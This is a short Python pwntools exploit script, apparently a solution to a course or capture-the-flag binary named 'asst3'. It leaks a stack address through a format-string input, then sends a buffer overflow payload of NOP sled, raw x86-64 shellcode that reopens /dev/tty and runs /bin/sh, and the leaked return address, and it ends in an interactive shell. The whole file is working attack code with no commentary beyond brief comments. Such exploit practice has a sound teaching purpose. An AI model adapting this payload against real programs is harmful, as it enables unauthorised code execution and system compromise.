#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./asst3", stdin=PTY)

# Ignore the first nine lines
for x in range(0, 9):
    p.recvline()

# Leak an address from memory
p.sendline("%4$p")
addr = p64(int(p.recvline().strip(), 16) + 4)

# Generate the payload
quit = b"quit"
shellcode = b"\x48\x81\xec\x2c\x01\x00\x00\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05"
nops = b'\x90'*(116 - len(shellcode))
payload = quit + nops + shellcode + addr

# Trigger the buffer overflow
p.sendline(payload)
p.interactive()
